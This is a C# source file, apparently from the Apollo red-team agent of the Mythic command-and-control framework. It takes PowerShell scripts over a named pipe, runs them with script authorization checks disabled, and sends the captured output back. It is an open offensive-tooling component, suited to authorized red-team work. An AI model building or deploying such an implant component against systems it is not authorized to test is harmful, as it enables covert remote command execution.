using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Classes.IO;
using System.Management.Automation.Runspaces;
using ApolloInterop.Serializers;
using System.Collections.Concurrent;
using ApolloInterop.Classes;
using System.Threading;
using ApolloInterop.Classes.Core;
using ApolloInterop.Structs.ApolloStructs;
using ApolloInterop.Interfaces;
using ST = System.Threading.Tasks;
using ApolloInterop.Enums.ApolloEnums;
using System.IO;
using System.IO.Pipes;
using ApolloInterop.Constants;
using ApolloInterop.Classes.Events;

namespace PowerShellHost
{
    class Program
    {

        private static JsonSerializer _jsonSerializer = new JsonSerializer();
        private static string _namedPipeName;
        private static ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private static ConcurrentQueue<IMythicMessage> _recieverQueue = new ConcurrentQueue<IMythicMessage>();
        private static AsyncNamedPipeServer _server;
        private static AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private static AutoResetEvent _receiverEvent = new AutoResetEvent(false);
        private static ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>> MessageStore = new ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>>();
        private static CancellationTokenSource _cts = new CancellationTokenSource();
        private static Action<object> _sendAction;
        private static ST.Task _clientConnectedTask = null;

        static void Main(string[] args)
        {

            if (args.Length != 1)
            {
                throw new Exception("No named pipe name given.");
            }
            _namedPipeName = args[0];

            _sendAction = (object p) =>
            {
                PipeStream pipe = (PipeStream)p;

                while (pipe.IsConnected && !_cts.IsCancellationRequested)
                {
                    WaitHandle.WaitAny(new WaitHandle[] {
                        _senderEvent,
                        _cts.Token.WaitHandle
                    });
                    if (_senderQueue.TryDequeue(out byte[] result))
                    {
                        pipe.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, pipe);
                    }
                }
                pipe.Flush();
                pipe.Close();
            };
            _server = new AsyncNamedPipeServer(_namedPipeName, null, 1, IPC.SEND_SIZE, IPC.RECV_SIZE);
            _server.ConnectionEstablished += OnAsyncConnect;
            _server.MessageReceived += OnAsyncMessageReceived;
            _receiverEvent.WaitOne();
            if (_recieverQueue.TryDequeue(out IMythicMessage psArgs))
            {
                if (psArgs.GetTypeCode() != MessageType.IPCCommandArguments)
                {
                    throw new Exception($"Got invalid message type. Wanted {MessageType.IPCCommandArguments}, got {psArgs.GetTypeCode()}");
                }
                TextWriter oldStdout = Console.Out;
                TextWriter oldStderr = Console.Error;

                EventableStringWriter stdoutSw = new EventableStringWriter();
                EventableStringWriter stderrSw = new EventableStringWriter();

                stdoutSw.BufferWritten += OnBufferWrite;


                Console.SetOut(stdoutSw);
                Console.SetError(stderrSw);
                CustomPowerShellHost psHost = new CustomPowerShellHost();
                var state = InitialSessionState.CreateDefault();
                state.AuthorizationManager = null;
                try
                {
                    using (Runspace runspace = RunspaceFactory.CreateRunspace(psHost, state))
                    {
                        runspace.Open();

                        using (Pipeline pipeline = runspace.CreatePipeline())
                        {
                            pipeline.Commands.AddScript(((IPCCommandArguments)psArgs).StringData);
                            pipeline.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output);
                            pipeline.Commands.Add("Out-Default");
                            pipeline.Invoke();
                        }
                    }
                } catch (Exception ex)
                {
                    Console.WriteLine($"[PowerShellHost Error] : Unhandled exception: {ex.Message}");
                } finally
                {
                    while(_senderQueue.Count > 0)
                    {
                        Thread.Sleep(1000);
                    }
                    Console.SetOut(oldStdout);
                    Console.SetOut(oldStderr);
                }
                _cts.Cancel();
            }


        }

        private static void OnBufferWrite(object sender, ApolloInterop.Classes.Events.StringDataEventArgs e)
        {
            if (e.Data != null)
            {
                _senderQueue.Enqueue(Encoding.UTF8.GetBytes(e.Data));
                _senderEvent.Set();
            }
        }

        private static void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            pipe.EndWrite(result);
            // Potentially delete this since theoretically the sender Task does everything
            if (_senderQueue.TryDequeue(out byte[] data))
            {
                pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
            }
        }

        private static void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
        {
            IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(
                Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
            lock (MessageStore)
            {
                if (!MessageStore.ContainsKey(chunkedData.ID))
                {
                    MessageStore[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
                    MessageStore[chunkedData.ID].MessageComplete += DeserializeToReceiverQueue;
                }
            }
            MessageStore[chunkedData.ID].AddMessage(chunkedData);
        }

        private static void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for (int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            IMythicMessage msg = _jsonSerializer.DeserializeIPCMessage(data.ToArray(), mt);
            //Console.WriteLine("We got a message: {0}", mt.ToString());
            _recieverQueue.Enqueue(msg);
            _receiverEvent.Set();
        }

        public static void OnAsyncConnect(object sender, NamedPipeMessageArgs args)
        {
            // We only accept one connection at a time, sorry.
            if (_clientConnectedTask != null)
            {
                args.Pipe.Close();
                return;
            }
            _clientConnectedTask = new ST.Task(_sendAction, args.Pipe);
            _clientConnectedTask.Start();
        }
    }
}
